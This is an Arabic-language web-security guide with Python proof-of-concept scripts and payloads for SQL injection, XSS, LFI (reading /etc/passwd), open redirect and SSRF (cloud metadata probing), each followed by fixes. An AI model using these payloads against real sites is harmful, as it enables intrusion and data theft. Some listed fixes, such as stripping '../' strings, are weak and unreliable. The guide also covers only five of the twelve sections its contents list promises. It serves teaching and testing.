# 🔐 دليل الثغرات الأمنية مع POC

<div dir="rtl">

## محتويات الدليل

1. [SQL Injection](#1-sql-injection)
2. [Cross-Site Scripting (XSS)](#2-cross-site-scripting-xss)
3. [Local File Inclusion (LFI)](#3-local-file-inclusion-lfi)
4. [Open Redirect](#4-open-redirect)
5. [Server-Side Request Forgery (SSRF)](#5-server-side-request-forgery-ssrf)
6. [XML External Entity (XXE)](#6-xml-external-entity-xxe)
7. [Cross-Site Request Forgery (CSRF)](#7-cross-site-request-forgery-csrf)
8. [Missing Security Headers](#8-missing-security-headers)
9. [Information Disclosure](#9-information-disclosure)
10. [Exposed Backup Files](#10-exposed-backup-files)
11. [CORS Misconfiguration](#11-cors-misconfiguration)
12. [Clickjacking](#12-clickjacking)

---

## 1. SQL Injection

### 📋 الوصف
ثغرة SQL Injection تسمح للمهاجم بحقن أوامر SQL خبيثة في استعلامات قاعدة البيانات.

### ⚠️ الخطورة
**Critical** - يمكن من خلالها:
- قراءة جميع البيانات من قاعدة البيانات
- تعديل أو حذف البيانات
- تنفيذ أوامر على الخادم
- الحصول على صلاحيات المسؤول

### 🔍 كيفية الاكتشاف
الأداة تختبر المعاملات في الروابط باستخدام payloads مثل:
- `' OR '1'='1`
- `' OR '1'='1' --`
- `' UNION SELECT NULL--`

### 💻 مثال POC

```python
import requests

# اختبار ثغرة SQL Injection
url = "https://vulnerable-site.com/product.php?id=1' OR '1'='1"
response = requests.get(url)

# البحث عن رسائل خطأ SQL
sql_errors = ['SQL syntax', 'mysql_fetch', 'ORA-', 'PostgreSQL']

for error in sql_errors:
    if error.lower() in response.text.lower():
        print(f"[+] الموقع معرض لـ SQL Injection!")
        print(f"[+] الخطأ المكتشف: {error}")
        print(f"[+] الرابط: {url}")
        break
```

### ✅ الحل

1. **استخدام Prepared Statements**:
```php
// ✅ صحيح
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);

// ❌ خطأ
$query = "SELECT * FROM users WHERE id = '$id'";
```

2. **تنظيف المدخلات**:
```php
$id = mysqli_real_escape_string($conn, $_GET['id']);
```

3. **استخدام ORMs**:
```python
# Django ORM
User.objects.filter(id=user_id)
```

---

## 2. Cross-Site Scripting (XSS)

### 📋 الوصف
ثغرة XSS تسمح بحقن أكواد JavaScript في صفحات الويب.

### ⚠️ الخطورة
**High** - يمكن من خلالها:
- سرقة Cookies والـ Sessions
- تنفيذ عمليات نيابة عن المستخدم
- إعادة توجيه المستخدمين لمواقع خبيثة
- تعديل محتوى الصفحة

### 🔍 كيفية الاكتشاف
اختبار انعكاس الأكواد JavaScript:
- `<script>alert(1)</script>`
- `<img src=x onerror=alert(1)>`
- `<svg/onload=alert(1)>`

### 💻 مثال POC

```python
import requests
import hashlib
import time

# توليد معرف فريد
test_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]

# اختبار XSS
url = f"https://vulnerable-site.com/search?q=<script>alert('{test_id}')</script>"
response = requests.get(url)

if test_id in response.text:
    print(f"[+] الموقع معرض لـ XSS!")
    print(f"[+] الكود المحقون: <script>alert('{test_id}')</script>")
    print(f"[+] الرابط: {url}")
    print(f"[+] يمكن استغلالها لسرقة Cookies")
```

### ✅ الحل

1. **HTML Encoding**:
```php
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
```

2. **Content Security Policy**:
```html
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self'">
```

3. **تنظيف المدخلات**:
```javascript
// استخدام مكتبات مثل DOMPurify
const clean = DOMPurify.sanitize(dirty);
```

---

## 3. Local File Inclusion (LFI)

### 📋 الوصف
ثغرة LFI تسمح بقراءة ملفات النظام من الخادم.

### ⚠️ الخطورة
**Critical** - يمكن من خلالها:
- قراءة ملفات حساسة (/etc/passwd)
- قراءة ملفات الإعدادات
- قراءة أكواد المصدر
- تنفيذ أكواد في بعض الحالات

### 💻 مثال POC

```python
import requests

# اختبار LFI
payloads = [
    '../../../etc/passwd',
    '....//....//....//etc/passwd',
    '/etc/passwd'
]

base_url = "https://vulnerable-site.com/view.php?file="

for payload in payloads:
    url = base_url + payload
    response = requests.get(url)
    
    if 'root:x:0:0:' in response.text:
        print(f"[+] الموقع معرض لـ LFI!")
        print(f"[+] الـ Payload: {payload}")
        print(f"[+] الرابط: {url}")
        print(f"\n[+] محتوى /etc/passwd:")
        print(response.text[:500])
        break
```

### ✅ الحل

1. **قائمة بيضاء للملفات**:
```php
$allowed_files = ['page1.php', 'page2.php', 'page3.php'];
if (in_array($file, $allowed_files)) {
    include($file);
}
```

2. **إزالة مسارات التنقل**:
```php
$file = str_replace(['../', '..\\'], '', $file);
```

3. **استخدام basename**:
```php
$file = basename($file);
```

---

## 4. Open Redirect

### 📋 الوصف
ثغرة Open Redirect تسمح بإعادة توجيه المستخدمين لمواقع خارجية.

### ⚠️ الخطورة
**Medium** - تستخدم في:
- هجمات Phishing
- تجاوز قوائم البيضاء
- إخفاء روابط خبيثة

### 💻 مثال POC

```python
import requests

# اختبار Open Redirect
test_url = "https://vulnerable-site.com/redirect?url=https://evil.com"

response = requests.get(test_url, allow_redirects=False)

if response.status_code in [301, 302, 303, 307, 308]:
    location = response.headers.get('Location', '')
    
    if 'evil.com' in location:
        print(f"[+] الموقع معرض لـ Open Redirect!")
        print(f"[+] الرابط: {test_url}")
        print(f"[+] يتم التوجيه إلى: {location}")
        print(f"[+] يمكن استخدامها في Phishing")
```

### ✅ الحل

1. **قائمة بيضاء للنطاقات**:
```php
$allowed_domains = ['example.com', 'subdomain.example.com'];
$parsed = parse_url($redirect_url);
if (in_array($parsed['host'], $allowed_domains)) {
    header("Location: $redirect_url");
}
```

2. **التحقق من النطاق**:
```javascript
const url = new URL(redirectUrl);
if (url.hostname === window.location.hostname) {
    window.location.href = redirectUrl;
}
```

---

## 5. Server-Side Request Forgery (SSRF)

### 📋 الوصف
ثغرة SSRF تسمح للمهاجم بإجبار الخادم على عمل طلبات لأهداف داخلية أو خارجية.

### ⚠️ الخطورة
**High** - يمكن من خلالها:
- الوصول لموارد داخلية
- قراءة AWS metadata
- فحص منافذ الشبكة الداخلية
- تجاوز جدران الحماية

### 💻 مثال POC

```python
import requests

# اختبار SSRF
test_urls = [
    "http://localhost",
    "http://127.0.0.1",
    "http://169.254.169.254/latest/meta-data/",  # AWS metadata
    "file:///etc/passwd"
]

base_url = "https://vulnerable-site.com/fetch?url="

for target in test_urls:
    url = base_url + target
    
    try:
        response = requests.get(url, timeout=10)
        
        if response.status_code == 200 and len(response.content) > 50:
            print(f"[+] الموقع قد يكون معرض لـ SSRF!")
            print(f"[+] الهدف: {target}")
            print(f"[+] الرابط: {url}")
            print(f"[+] طول الاستجابة: {len(response.content)} بايت")
            break
    except:
        continue
```

### ✅ الحل

1. **قائمة بيضاء للبروتوكولات**:
```python
allowed_protocols = ['http', 'https']
parsed = urlparse(user_url)
if parsed.scheme not in allowed_protocols:
    raise ValueError("Protocol not allowed")
```

2. **منع الوصول للشبكات الداخلية**:
```python
import ipaddress

def is_private_ip(ip):
    return ipaddress.ip_address(ip).is_private

# رفض العناوين الداخلية
```

3. **استخدام خدمات وسيطة**:
```python
# استخدام proxy آمن للطلبات الخارجية
```

---

## 🛡️ نصائح عامة للحماية

### للمطورين:
1. ✅ تنظيف جميع المدخلات
2. ✅ استخدام Prepared Statements
3. ✅ تطبيق مبدأ Least Privilege
4. ✅ تحديث المكتبات بانتظام
5. ✅ إجراء فحوصات أمنية دورية

### لمديري الأنظمة:
1. ✅ تطبيق WAF (Web Application Firewall)
2. ✅ مراقبة السجلات
3. ✅ استخدام HTTPS فقط
4. ✅ تحديث الأنظمة بانتظام
5. ✅ عمل نسخ احتياطية

### للمستخدمين:
1. ✅ استخدام كلمات مرور قوية
2. ✅ تفعيل المصادقة الثنائية
3. ✅ تحديث المتصفحات
4. ✅ الحذر من روابط Phishing
5. ✅ استخدام مدير كلمات مرور

---

## 📚 مصادر إضافية

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackerOne Hacktivity](https://hackerone.com/hacktivity)
- [Bug Bounty Platforms](https://www.bugcrowd.com/)

---

<div align="center">

**🔒 الأمن السيبراني مسؤولية الجميع**

</div>

</div>
